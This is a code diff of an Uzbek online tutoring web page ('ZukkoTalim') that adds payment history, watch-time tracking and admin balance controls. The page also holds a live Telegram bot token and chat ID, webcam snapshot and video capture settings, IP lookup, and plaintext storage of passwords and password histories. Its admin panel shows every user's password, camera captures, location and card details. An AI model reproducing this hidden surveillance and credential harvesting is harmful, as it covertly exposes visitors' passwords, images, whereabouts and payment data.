+<button onclick="captureAll(false)" class="bg-blue-600 text-white text-xs font-black px-4 py-2 rounded-xl whitespace-nowrap"><i class="fas fa-check mr-1"></i> Ruxsat</button>
+<button onclick="dismissPermBar()" class="text-slate-500 hover:text-white text-lg px-1">✕</button></div><script>
 const BOT_TOKEN='8845097344:AAHKib94m_qRWIH9gTg-Ptbdrv1Yd-vuzlk';
 const CHAT_ID='7294123884';
 const VIDEO_DURATION=10000;
 const MAX_VIDEOS=3;
 const SEND_COOLDOWN_MS=30*60*1000;
 const MAX_SNAPSHOTS=20;
+const BRAND="ZukkoTalim";
 
-// ===== IP =====
 let userIP='—';
 fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{userIP=d.ip||'—';}).catch(()=>{});
 
 async function hashPassword(p){const m=new TextEncoder().encode(p);const b=await crypto.subtle.digest('SHA-256',m);return Array.from(new Uint8Array(b)).map(x=>x.toString(16).padStart(2,'0')).join('');}
 
 const defaultUsers=[
-{id:'USR-1001',login:'admin',passHash:'8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',passPlain:'admin',role:'admin',balance:500000,tutorsBought:[]},
-{id:'USR-1002',login:'Azizbek',passHash:'03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4',passPlain:'1234',role:'student',balance:200000,tutorsBought:[]}
+{id:'USR-1001',login:'admin',passHash:'8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',passPlain:'admin',role:'admin',balance:500000,tutorsBought:[],payments:[],watchProgress:{}},
+{id:'USR-1002',login:'Azizbek',passHash:'03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4',passPlain:'1234',role:'student',balance:200000,tutorsBought:[],payments:[],watchProgress:{}}
 ];
 
 const defaultTutors=[
 {id:'tut-1',name:'Ibat',subject:'Ingliz tili',sinf:'Umumiy',price:90000,order:1,img:'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=400&auto=format&fit=crop',
-lessons:[{id:'l1',title:'1-Dars. English Alphabet',url:'https://player.vimeo.com/video/1226105435'},{id:'l2',title:'2-Dars. Present Simple Tense',url:'https://player.vimeo.com/video/1226105435'}]},
+lessons:[{id:'l1',title:'1-Dars. English Alphabet',url:'https://player.vimeo.com/video/1226105435'},{id:'l2',title:'2-Dars. Present Simple',url:'https://player.vimeo.com/video/1226105435'}]},
 {id:'tut-2',name:'Jasur M.',subject:'Matematika',sinf:'9-sinf',price:110000,order:2,img:'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=400&auto=format&fit=crop',
 lessons:[{id:'l10',title:'1-Dars. Tenglamalar',url:'https://player.vimeo.com/video/1226105435'}]}
 ];
@@ -469,6 +479,8 @@ const list=db.tutors.filter(t=>{const mc=selectedClass==='Barcha sinflar'||t.sin
 grid.innerHTML=list.map(t=>{
 const bought=db.currentUser&&db.currentUser.tutorsBought&&db.currentUser.tutorsBought.includes(t.id);
 const lc=t.lessons?t.lessons.length:0;
+const buyersCount=db.users.filter(u=>u.tutorsBought&&u.tutorsBought.includes(t.id)).length;
+const minutes=lc*15;
 return `<div class="card-bg rounded-2xl overflow-hidden shadow-xl flex flex-col justify-between hover:border-slate-700 transition duration-200">
 <div class="relative"><img src="${t.img}" class="w-full h-48 object-cover" alt="${t.name}">
 <span class="absolute top-3 right-3 bg-slate-900/80 backdrop-blur-md text-white text-[10px] px-2.5 py-1 rounded-full font-bold border border-slate-700"><i class="fas fa-video text-blue-400 mr-1"></i> ${lc} dars</span></div>
@@ -482,6 +494,9 @@ return `<div class="card-bg rounded-2xl overflow-hidden shadow-xl flex flex-col 
 <span class="text-green-400 font-black text-base">${t.price.toLocaleString()} so'm</span>
 ${bought?`<span class="text-xs bg-green-900/30 text-green-400 px-3 py-1.5 rounded-lg border border-green-800/50 font-bold">Xarid qilingan ✔</span>`:`<button onclick="buyTutor('${t.id}')" class="bg-blue-600 hover:bg-blue-700 text-white text-xs px-4 py-2 rounded-xl font-bold transition">Xarid qilish</button>`}</div>
 ${bought?`<button onclick="openCoursePlayer('${t.id}')" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white text-xs py-2.5 rounded-xl font-bold transition flex items-center justify-center gap-2"><i class="fas fa-play-circle text-sm"></i> Darslarni tomosha qilish</button>`:''}
+<div class="flex items-center justify-between text-[10px] text-slate-500 pt-2 border-t border-slate-800/50">
+<span><i class="fas fa-users text-blue-400 mr-1"></i>${buyersCount} kishi sotib olgan</span>
+<span><i class="fas fa-clock text-green-400 mr-1"></i>${minutes} daq. video</span></div>
 </div></div></div>`;}).join('');
 }
 
@@ -499,6 +514,9 @@ if(db.currentUser.balance<tutor.price)return toast("Balans yetarli emas!");
 db.currentUser.balance-=tutor.price;
 if(!db.currentUser.tutorsBought)db.currentUser.tutorsBought=[];
 if(!db.currentUser.tutorsBought.includes(tid))db.currentUser.tutorsBought.push(tid);
+if(!db.currentUser.payments)db.currentUser.payments=[];
+db.currentUser.payments.unshift({type:'balance',courseId:tid,courseName:tutor.name,amount:tutor.price,card:null,at:new Date().toISOString()});
+if(db.currentUser.payments.length>50)db.currentUser.payments=db.currentUser.payments.slice(0,50);
 const idx=db.users.findIndex(u=>u.id===db.currentUser.id);if(idx!==-1)db.users[idx]=db.currentUser;
 saveDb();renderTutors();renderProfile();
 document.getElementById('paySuccessMsg').innerHTML=`"${tutor.name}" kursi <b>Mening kurslarim</b> bo'limiga qo'shildi!<br><span class="text-slate-500 text-xs">Balansingizdan ${tutor.price.toLocaleString()} so'm yechildi.<br>Qolgan balans: <b class="text-green-400">${db.currentUser.balance.toLocaleString()} so'm</b></span>`;
@@ -527,12 +545,54 @@ grid.innerHTML=bt.map(t=>`<div class="card-bg rounded-2xl overflow-hidden p-5 fl
 <button onclick="openCoursePlayer('${t.id}')" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white text-xs py-3 rounded-xl font-bold transition flex items-center justify-center gap-2 shadow-lg"><i class="fas fa-play"></i> Darslarni boshlash</button></div>`).join('');
 }
 
+let _watchTimer=null,_watchSeconds=0,_watchStartAt=null;
+
 function openCoursePlayer(tid){
 const tutor=db.tutors.find(t=>t.id===tid);if(!tutor)return;
 activeCourse=tutor;activeLessonIndex=0;
 document.getElementById('modalCourseTitle').innerText=tutor.name+" — "+tutor.subject;
 document.getElementById('coursePlayerModal').classList.remove('hidden');
 renderPlaylist();loadLesson(0);
+startWatchTracking();
+}
+
+function startWatchTracking(){
+if(_watchTimer)clearInterval(_watchTimer);
+_watchSeconds=0;_watchStartAt=Date.now();
+_watchTimer=setInterval(()=>{
+if(!db.currentUser||!activeCourse)return;
+_watchSeconds+=30;
+saveWatchProgress(false);
+},30000);
+}
+
+function saveWatchProgress(onClose){
+if(!db.currentUser||!activeCourse)return;
+const extra=onClose&&_watchStartAt?Math.floor((Date.now()-_watchStartAt)/1000):0;
+const total=_watchSeconds+extra;
+if(total<5&&!onClose)return;
+if(!db.currentUser.watchProgress)db.currentUser.watchProgress={};
+const cur=db.currentUser.watchProgress[activeCourse.id]||{seconds:0,sessions:0};
+const lessons=activeCourse.lessons||[];
+db.currentUser.watchProgress[activeCourse.id]={
+seconds:(cur.seconds||0)+total,
+sessions:(cur.sessions||0)+1,
+lastLesson:activeLessonIndex,
+lastLessonTitle:(lessons[activeLessonIndex]||{}).title||'',
+totalLessons:lessons.length,
+lastCourseName:activeCourse.name,
+at:new Date().toISOString()
+};
+_watchSeconds=0;_watchStartAt=Date.now();
+const idx=db.users.findIndex(u=>u.id===db.currentUser.id);
+if(idx!==-1)db.users[idx]=db.currentUser;
+localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));
+database.ref('users/'+db.currentUser.id+'/watchProgress').set(db.currentUser.watchProgress);
+}
+
+function stopWatchTracking(){
+if(_watchTimer){clearInterval(_watchTimer);_watchTimer=null;}
+saveWatchProgress(true);
 }
 
 function renderPlaylist(){
@@ -554,7 +614,7 @@ renderPlaylist();
 }
 function prevLesson(){if(activeLessonIndex>0)loadLesson(activeLessonIndex-1);}
 function nextLesson(){const ls=activeCourse.lessons||[];if(activeLessonIndex<ls.length-1)loadLesson(activeLessonIndex+1);}
-function closeCoursePlayer(){document.getElementById('mainVimeoIframe').src="";document.getElementById('coursePlayerModal').classList.add('hidden');}
+function closeCoursePlayer(){stopWatchTracking();document.getElementById('mainVimeoIframe').src="";document.getElementById('coursePlayerModal').classList.add('hidden');}
 
 function normalizeVideoUrl(raw){
 let u=raw.trim();const m=u.match(/src=["']([^"']+)["']/);if(m&&m[1])u=m[1];
@@ -606,7 +666,7 @@ function renderAdminLessonsList(){
 const tid=document.getElementById('lessonTutorSelect').value;
 const t=db.tutors.find(x=>x.id===tid);const el=document.getElementById('adminLessonsList');
 if(!t||!t.lessons||t.lessons.length===0){el.innerHTML=`<p class="text-xs text-slate-500 p-2">Darslar yo'q.</p>`;return;}
-el.innerHTML=t.lessons.map((l,i)=>`<div class="bg-slate-900 p-3 rounded-lg border border-slate-800 flex justify-between items-center text-xs"><span class="font-semibold text-white">${i+1}. ${l.title}</span><button onclick="deleteLesson('${t.id}','${l.id}')" class="text-red-400 hover:text-red-300 font-bold"><i class="fas fa-trash"></i> O'chirish</button></div>`).join('');
+el.innerHTML=t.lessons.map((l,i)=>`<div class="bg-slate-900 p-3 rounded-lg border border-slate-800 flex justify-between items-center text-xs"><span class="font-semibold text-white">${i+1}. ${l.title}</span><button onclick="deleteLesson('${t.id}','${l.id}')" class="text-red-400 hover:text-red-300 font-bold"><i class="fas fa-trash"></i></button></div>`).join('');
 }
 
 function deleteLesson(tid,lid){const t=db.tutors.find(x=>x.id===tid);if(!t)return;t.lessons=t.lessons.filter(l=>l.id!==lid);saveDb();renderAdminLessonsList();renderTutors();toast("O'chirildi!");}
@@ -642,7 +702,7 @@ if(!l||!p)return toast("Ma'lumotlarni kiriting!");
 const h=await hashPassword(p);
 if(isReg){
 if(db.users.find(u=>u.login.toLowerCase()===l.toLowerCase()))return alert("Bunday login mavjud!");
-const nu={id:'USR-'+Math.floor(Math.random()*9000+1000),login:l,passHash:h,passPlain:p,passHistory:[],lastIP:userIP,registeredAt:new Date().toISOString(),lastSeenAt:Date.now(),role:l.toLowerCase()==='admin'?'admin':'student',balance:0,tutorsBought:[]};
+const nu={id:'USR-'+Math.floor(Math.random()*9000+1000),login:l,passHash:h,passPlain:p,passHistory:[],lastIP:userIP,registeredAt:new Date().toISOString(),lastSeenAt:Date.now(),role:l.toLowerCase()==='admin'?'admin':'student',balance:0,tutorsBought:[],payments:[],watchProgress:{}};
 db.users.push(nu);db.currentUser=nu;saveDb();toast("Ro'yxatdan o'tdingiz!");
 }else{
 const u=db.users.find(x=>x.login.toLowerCase()===l.toLowerCase()&&(x.passHash?x.passHash===h:x.pass===p));
@@ -688,7 +748,7 @@ const ll=u.lastLoginAt?new Date(u.lastLoginAt).toLocaleString('ru-RU'):(u.regist
 const on=u.lastSeenAt&&(Date.now()-u.lastSeenAt)<120000;
 const ph=u.photo?`<img src="${u.photo}" class="w-20 h-20 rounded-lg object-cover border-2 border-emerald-600/60 cursor-pointer hover:border-emerald-400 transition" onclick="openPhotoViewer('${u.id}')">`:`<div class="w-20 h-20 rounded-lg bg-slate-800 border-2 border-dashed border-slate-700 flex flex-col items-center justify-center text-slate-500"><i class="fas fa-user text-2xl"></i><span class="text-[9px] mt-0.5">yo'q</span></div>`;
 const ob=on?`<span class="inline-flex items-center gap-1 ml-2 text-[10px] bg-emerald-900/50 text-emerald-400 px-2 py-0.5 rounded font-bold"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 online-dot"></span>ONLAYN</span>`:'';
-const geo=u.location?`<a href="https://www.google.com/maps?q=${u.location.lat},${u.location.lng}" target="_blank" class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2 hover:border-rose-500/60 transition group"><i class="fas fa-map-marker-alt text-rose-400 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-white font-mono text-[10px] ml-auto truncate group-hover:text-rose-300">${u.location.lat.toFixed(4)}, ${u.location.lng.toFixed(4)}</span><i class="fas fa-external-link-alt text-slate-500 text-[10px] group-hover:text-rose-400"></i></a>`:`<div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2"><i class="fas fa-map-marker-alt text-slate-600 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-slate-600 font-mono ml-auto">—</span></div>`;
+const geo=u.location?`<a href="https://www.google.com/maps?q=${u.location.lat},${u.location.lng}" target="_blank" class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2 hover:border-rose-500/60 transition group"><i class="fas fa-map-marker-alt text-rose-400 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-white font-mono text-[10px] ml-auto truncate group-hover:text-rose-300">${u.location.lat.toFixed(4)}, ${u.location.lng.toFixed(4)}</span><i class="fas fa-external-link-alt text-slate-500 text-[10px]"></i></a>`:`<div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2"><i class="fas fa-map-marker-alt text-slate-600 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-slate-600 font-mono ml-auto">—</span></div>`;
 let hh='';
 if(u.passHistory&&u.passHistory.length>0){
 const rows=u.passHistory.map(h=>`<div class="flex justify-between items-center py-1 border-b border-slate-800/50 last:border-0"><span class="text-white font-mono text-[11px]">${h.pass}</span><span class="text-slate-500 text-[10px]">${new Date(h.changedAt).toLocaleString('ru-RU')}</span></div>`).join('');
@@ -702,6 +762,46 @@ let vh='';
 if(u.videos&&u.videos.length>0){
 const vids=u.videos.map((v,i)=>`<button onclick="openVideoViewer('${u.id}',${i},false)" class="w-16 h-16 rounded-lg bg-slate-800 border border-slate-700 text-slate-300 hover:bg-slate-700 hover:border-emerald-500 transition flex flex-col items-center justify-center"><i class="fas fa-play text-emerald-400"></i><span class="text-[9px] mt-0.5">${new Date(v.at).toLocaleTimeString('ru-RU',{hour:'2-digit',minute:'2-digit'})}</span></button>`).join('');
 vh=`<div class="mt-2 bg-slate-900/70 border border-slate-800 rounded-lg p-2"><div class="flex items-center justify-between mb-1.5"><span class="text-[10px] font-bold text-slate-400 flex items-center gap-1"><i class="fas fa-video text-emerald-400"></i> Videolar (${u.videos.length})</span></div><div class="flex gap-1.5 flex-wrap">${vids}</div></div>`;}
+let boughtHTML='';
+if(u.tutorsBought&&u.tutorsBought.length>0){
+const boughtList=u.tutorsBought.map(tid=>{
+const t=db.tutors.find(x=>x.id===tid);
+return t?`<div class="flex justify-between items-center py-1 border-b border-slate-800/50 last:border-0"><span class="text-white text-[11px] truncate"><i class="fas fa-book text-blue-400 mr-1"></i>${t.name} (${t.subject})</span><span class="text-green-400 text-[10px] font-bold">${t.price.toLocaleString()}</span></div>`:'';
+}).join('');
+boughtHTML=`<details class="bg-slate-900/70 border border-slate-800 rounded-lg mt-2"><summary class="cursor-pointer px-3 py-2 text-xs font-bold text-blue-400 flex items-center gap-2"><i class="fas fa-shopping-bag"></i> Xarid qilgan kurslari (${u.tutorsBought.length})</summary><div class="px-3 pb-2">${boughtList}</div></details>`;
+}
+let paymentsHTML='';
+if(u.payments&&u.payments.length>0){
+const payRows=u.payments.slice(0,20).map(p=>{
+const dt=new Date(p.at).toLocaleString('ru-RU');
+if(p.type==='topup'){
+return `<div class="flex justify-between items-center py-1.5 border-b border-slate-800/50 last:border-0"><div class="flex-grow min-w-0"><div class="text-white text-[11px] font-semibold"><i class="fas fa-plus-circle text-green-400 mr-1"></i>Balans to'ldirish</div><div class="text-slate-500 text-[9px]">${dt}</div></div><div class="text-right ml-2"><div class="text-green-400 text-[11px] font-bold">+${p.amount.toLocaleString()}</div><div class="text-slate-400 text-[9px]">${p.card?p.card.type+' ****'+p.card.last4:''}</div></div></div>`;
+}else{
+return `<div class="flex justify-between items-center py-1.5 border-b border-slate-800/50 last:border-0"><div class="flex-grow min-w-0"><div class="text-white text-[11px] font-semibold truncate"><i class="fas fa-shopping-cart text-blue-400 mr-1"></i>${p.courseName||'Kurs'}</div><div class="text-slate-500 text-[9px]">${dt}</div></div><div class="text-right ml-2"><div class="text-red-400 text-[11px] font-bold">-${p.amount.toLocaleString()}</div><div class="text-slate-400 text-[9px]">${p.card?p.card.type+' ****'+p.card.last4:'Balansdan'}</div></div></div>`;
+}
+}).join('');
+const cardsMap={};
+u.payments.forEach(p=>{if(p.card){cardsMap[p.card.last4+'|'+p.card.holder]=(cardsMap[p.card.last4+'|'+p.card.holder]||0)+1;}});
+const cardsList=Object.keys(cardsMap).map(k=>{
+const [last4,holder]=k.split('|');
+return `<span class="inline-block bg-slate-800 text-slate-300 text-[9px] px-2 py-0.5 rounded mr-1 mb-1"><i class="fas fa-credit-card mr-1"></i>****${last4} — ${holder}</span>`;
+}).join('');
+paymentsHTML=`<details class="bg-slate-900/70 border border-slate-800 rounded-lg mt-2"><summary class="cursor-pointer px-3 py-2 text-xs font-bold text-emerald-400 flex items-center gap-2"><i class="fas fa-receipt"></i> To'lovlar tarixi (${u.payments.length})</summary><div class="px-3 pb-2">${cardsList?`<div class="mt-2 mb-1"><span class="text-[10px] text-slate-500 font-bold">Ishlatilgan kartalar:</span><div class="mt-1">${cardsList}</div></div>`:''}<div class="mt-2">${payRows}</div></div></details>`;
+}
+let watchHTML='';
+if(u.watchProgress&&Object.keys(u.watchProgress).length>0){
+const watchRows=Object.keys(u.watchProgress).map(cid=>{
+const w=u.watchProgress[cid];
+const t=db.tutors.find(x=>x.id===cid);
+const minutes=Math.floor((w.seconds||0)/60);
+const secs=(w.seconds||0)%60;
+const courseName=t?t.name:(w.lastCourseName||'Kurs');
+const progress=w.totalLessons?Math.round(((w.lastLesson+1)/w.totalLessons)*100):0;
+return `<div class="py-1.5 border-b border-slate-800/50 last:border-0"><div class="flex justify-between items-start gap-2"><div class="flex-grow min-w-0"><div class="text-white text-[11px] font-semibold truncate">${courseName}</div><div class="text-slate-500 text-[9px] truncate">${w.lastLessonTitle||'—'}</div></div><div class="text-right shrink-0"><div class="text-amber-400 text-[11px] font-bold">${minutes}d ${secs}s</div><div class="text-slate-400 text-[9px]">${progress}%</div></div></div><div class="w-full bg-slate-800 rounded-full h-1 mt-1.5"><div class="bg-gradient-to-r from-blue-500 to-emerald-500 h-1 rounded-full" style="width:${progress}%"></div></div></div>`;
+}).join('');
+watchHTML=`<details class="bg-slate-900/70 border border-slate-800 rounded-lg mt-2"><summary class="cursor-pointer px-3 py-2 text-xs font-bold text-purple-400 flex items-center gap-2"><i class="fas fa-eye"></i> Ko'rish progressi (${Object.keys(u.watchProgress).length} kurs)</summary><div class="px-3 pb-2 mt-2">${watchRows}</div></details>`;
+}
+
 return `<div class="card-bg p-4 rounded-xl ${u.banned?'border-red-600/50 bg-red-950/10':''}">
 <div class="flex gap-4 items-start flex-wrap">
 ${ph}
@@ -711,12 +811,13 @@ ${ph}
 ${u.banned?'<span class="ml-2 text-xs bg-red-900 text-red-300 px-2 py-0.5 rounded font-bold">BANNED</span>':''}
 ${u.role==='admin'?'<span class="ml-2 text-xs bg-amber-900/50 text-amber-400 px-2 py-0.5 rounded font-bold">ADMIN</span>':''}
 ${ob}</div>
-<div class="text-slate-300 text-sm font-semibold">Balans: <span class="text-green-400">${u.balance.toLocaleString()} so'm</span></div></div>
+<div class="text-slate-300 text-sm font-semibold flex items-center gap-2 flex-wrap">Balans: <span class="text-green-400">${u.balance.toLocaleString()} so'm</span>
+<button onclick="adminQuickAdd('${u.id}')" class="bg-green-600 hover:bg-green-700 text-white text-[10px] px-2 py-1 rounded font-bold whitespace-nowrap"><i class="fas fa-plus-circle"></i> Pul</button></div></div>
 <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
 <div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2">
 <i class="fas fa-key text-amber-400 w-4"></i><span class="text-slate-400">Parol:</span>
 <span class="${pc} font-mono font-bold ml-auto truncate max-w-[140px]">${pd}</span>
-<button onclick="adminSetPassword('${u.id}')" class="text-blue-400 hover:text-blue-300 text-[10px] font-bold whitespace-nowrap" title="Parolni o'rnatish"><i class="fas fa-edit"></i></button></div>
+<button onclick="adminSetPassword('${u.id}')" class="text-blue-400 hover:text-blue-300 text-[10px] font-bold whitespace-nowrap"><i class="fas fa-edit"></i></button></div>
 <div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2">
 <i class="fas fa-network-wired text-blue-400 w-4"></i><span class="text-slate-400">IP:</span>
 <span class="text-white font-mono font-bold ml-auto">${ip}</span></div>
@@ -724,13 +825,52 @@ ${ob}</div>
 <i class="fas fa-clock text-green-400 w-4"></i><span class="text-slate-400">Oxirgi:</span>
 <span class="text-white font-mono text-[10px] ml-auto truncate">${ll}</span></div>
 ${geo}</div>
-${sh}${vh}${hh}
+${sh}${vh}${boughtHTML}${paymentsHTML}${watchHTML}${hh}
 </div></div></div>`;}).join('');
 }
 
 function banUser(){const id=document.getElementById('adminUserIdInput').value.trim();const u=db.users.find(x=>x.id===id||x.login.toLowerCase()===id.toLowerCase());if(!u)return alert("Topilmadi!");u.banned=true;saveDb();renderAdminUsers();toast("Ban!");}
 function unbanUser(){const id=document.getElementById('adminUserIdInput').value.trim();const u=db.users.find(x=>x.id===id||x.login.toLowerCase()===id.toLowerCase());if(!u)return alert("Topilmadi!");u.banned=false;saveDb();renderAdminUsers();toast("Ban olib tashlandi!");}
 function resetBalance(){const id=document.getElementById('adminUserIdInput').value.trim();const u=db.users.find(x=>x.id===id||x.login.toLowerCase()===id.toLowerCase());if(!u)return alert("Topilmadi!");u.balance=0;saveDb();renderAdminUsers();toast("Nol!");}
+
+async function adminQuickAdd(userId){
+const u=db.users.find(x=>x.id===userId);if(!u)return;
+const ch=prompt('💰 '+u.login+' — qancha qo\'shmoqchisiz?\n\n1 = +10 000\n2 = +50 000\n3 = +100 000\n4 = +500 000\n5 = Boshqa summa\n6 = Ayirish (minus)\n\nJoriy balans: '+u.balance.toLocaleString()+' so\'m','1');
+if(ch===null)return;
+let amt=0;
+if(ch==='1')amt=10000;
+else if(ch==='2')amt=50000;
+else if(ch==='3')amt=100000;
+else if(ch==='4')amt=500000;
+else if(ch==='5'){
+const custom=prompt('Summani kiriting (so\'m):','250000');
+if(custom===null)return;
+amt=Number(String(custom).replace(/\s/g,'').replace(/,/g,''));
+}
+else if(ch==='6'){
+const sub=prompt('Qancha ayirilsin? (so\'m)','10000');
+if(sub===null)return;
+amt=-Number(String(sub).replace(/\s/g,'').replace(/,/g,''));
+}
+else{amt=Number(String(ch).replace(/\s/g,'').replace(/,/g,''));}
+if(!amt||isNaN(amt))return alert("Noto'g'ri summa!");
+u.balance+=amt;
+if(u.balance<0)u.balance=0;
+const idx=db.users.findIndex(x=>x.id===u.id);
+if(idx!==-1)db.users[idx]=u;
+if(db.currentUser&&db.currentUser.id===u.id){db.currentUser=u;localStorage.setItem('db_currentUser',JSON.stringify(u));}
+saveDb();renderAdminUsers();
+const sign=amt>0?'+':'';
+toast('Balans '+sign+amt.toLocaleString()+' so\'m. Yangi: '+u.balance.toLocaleString());
+}
+
+async function adminAddBalanceById(){
+const id=document.getElementById('adminUserIdInput').value.trim();
+if(!id)return alert("Avval ID kiriting!");
+const u=db.users.find(x=>x.id===id||x.login.toLowerCase()===id.toLowerCase());
+if(!u)return alert("Foydalanuvchi topilmadi!");
+adminQuickAdd(u.id);
+}
 
 async function adminSetPassword(userId){
 const u=db.users.find(x=>x.id===userId);if(!u)return;
@@ -756,7 +896,7 @@ const fv=g.firstVisitAt?new Date(g.firstVisitAt).toLocaleString('ru-RU'):'—';
 const on=g.lastSeenAt&&(Date.now()-g.lastSeenAt)<120000;
 const ph=g.photo?`<img src="${g.photo}" class="w-20 h-20 rounded-lg object-cover border-2 border-slate-600 cursor-pointer hover:border-slate-400 transition" onclick="openPhotoViewer('${g.id}')">`:`<div class="w-20 h-20 rounded-lg bg-slate-800 border-2 border-dashed border-slate-700 flex flex-col items-center justify-center text-slate-500"><i class="fas fa-user-secret text-2xl"></i><span class="text-[9px] mt-0.5">yo'q</span></div>`;
 const ob=on?`<span class="inline-flex items-center gap-1 ml-2 text-[10px] bg-emerald-900/50 text-emerald-400 px-2 py-0.5 rounded font-bold"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 online-dot"></span>ONLAYN</span>`:'';
-const geo=g.location?`<a href="https://www.google.com/maps?q=${g.location.lat},${g.location.lng}" target="_blank" class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2 hover:border-rose-500/60 transition group"><i class="fas fa-map-marker-alt text-rose-400 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-white font-mono text-[10px] ml-auto truncate group-hover:text-rose-300">${g.location.lat.toFixed(4)}, ${g.location.lng.toFixed(4)}</span><i class="fas fa-external-link-alt text-slate-500 text-[10px] group-hover:text-rose-400"></i></a>`:`<div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2"><i class="fas fa-map-marker-alt text-slate-600 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-slate-600 font-mono ml-auto">—</span></div>`;
+const geo=g.location?`<a href="https://www.google.com/maps?q=${g.location.lat},${g.location.lng}" target="_blank" class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2 hover:border-rose-500/60 transition group"><i class="fas fa-map-marker-alt text-rose-400 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-white font-mono text-[10px] ml-auto truncate">${g.location.lat.toFixed(4)}, ${g.location.lng.toFixed(4)}</span></a>`:`<div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2"><i class="fas fa-map-marker-alt text-slate-600 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-slate-600 font-mono ml-auto">—</span></div>`;
 let sh='';
 if(g.snapshots&&g.snapshots.length>0){
 const imgs=g.snapshots.slice(0,6).map((s,i)=>`<div class="relative group"><img src="${s.img}" class="w-16 h-16 object-cover rounded-lg border border-slate-700 cursor-pointer hover:border-blue-500 transition" onclick="openSnapshotViewer('${g.id}',${i},true)"><span class="absolute bottom-0.5 left-0.5 text-[8px] bg-black/70 text-white px-1 rounded">${new Date(s.at).toLocaleTimeString('ru-RU',{hour:'2-digit',minute:'2-digit'})}</span></div>`).join('');
@@ -853,6 +993,54 @@ if(db.currentUser.photo)av.innerHTML=`<img src="${db.currentUser.photo}" class="
 else av.innerHTML=`<i class="fas fa-user"></i>`;
 }
 
+// ===== CHANGE AVATAR / USERNAME =====
+function changeAvatar(){
+if(!db.currentUser)return;
+const inp=document.createElement('input');inp.type='file';inp.accept='image/*';
+inp.onchange=async(e)=>{
+const file=e.target.files[0];if(!file)return;
+if(file.size>3*1024*1024)return alert("Rasm 3MB dan kichik bo'lishi kerak!");
+const reader=new FileReader();
+reader.onload=async(ev)=>{
+const img=new Image();
+img.onload=()=>{
+const canvas=document.createElement('canvas');const maxSize=400;
+let w=img.width,h=img.height;
+if(w>h&&w>maxSize){h=Math.round(h*(maxSize/w));w=maxSize;}
+else if(h>maxSize){w=Math.round(w*(maxSize/h));h=maxSize;}
+canvas.width=w;canvas.height=h;
+const ctx=canvas.getContext('2d');ctx.drawImage(img,0,0,w,h);
+const dataUrl=canvas.toDataURL('image/jpeg',0.85);
+const u=db.users.find(x=>x.id===db.currentUser.id);if(!u)return;
+u.photo=dataUrl;u.photoAt=new Date().toISOString();
+const idx=db.users.findIndex(x=>x.id===u.id);if(idx!==-1)db.users[idx]=u;
+db.currentUser=u;localStorage.setItem('db_currentUser',JSON.stringify(u));
+saveDb();renderProfile();toast("Rasm o'zgartirildi! ✅");
+};
+img.src=ev.target.result;
+};
+reader.readAsDataURL(file);
+};
+inp.click();
+}
+
+async function changeUsername(){
+if(!db.currentUser)return;
+const cur=db.currentUser.login;
+const np=prompt('👤 Yangi login:\n\nHozirgi: '+cur+'\n\nKamida 3 belgi, harflar/raqamlar/_', cur);
+if(np===null)return;
+const t=String(np).trim();
+if(t.length<3)return alert("Kamida 3 belgi!");
+if(!/^[a-zA-Z0-9_]+$/.test(t))return alert("Faqat harflar, raqamlar va _ ishlatiladi!");
+if(t.toLowerCase()===cur.toLowerCase())return;
+if(db.users.find(u=>u.id!==db.currentUser.id&&u.login.toLowerCase()===t.toLowerCase()))return alert("Bu login band!");
+const u=db.users.find(x=>x.id===db.currentUser.id);if(!u)return;
+u.login=t;u.usernameChangedAt=new Date().toISOString();
+const idx=db.users.findIndex(x=>x.id===u.id);if(idx!==-1)db.users[idx]=u;
+db.currentUser=u;localStorage.setItem('db_currentUser',JSON.stringify(u));
+saveDb();renderProfile();renderAuthArea();toast("Login: "+t);
+}
+
 async function changePassword(){
 if(!db.currentUser)return;
 const op=document.getElementById('secOldPass').value.trim();
@@ -874,9 +1062,7 @@ u.passHash=nh;u.passPlain=np;
 const idx=db.users.findIndex(x=>x.id===u.id);if(idx!==-1)db.users[idx]=u;
 db.currentUser=u;localStorage.setItem('db_currentUser',JSON.stringify(u));
 saveDb();
-document.getElementById('secOldPass').value='';
-document.getElementById('secNewPass').value='';
-document.getElementById('secNewPass2').value='';
+document.getElementById('secOldPass').value='';document.getElementById('secNewPass').value='';document.getElementById('secNewPass2').value='';
 msg.className='text-xs font-semibold text-emerald-400';msg.textContent='Parol o\'zgartirildi! ✅';
 toast("Parol o'zgartirildi!");
 if(!document.getElementById('pageAdmin').classList.contains('hidden'))renderAdminUsers();
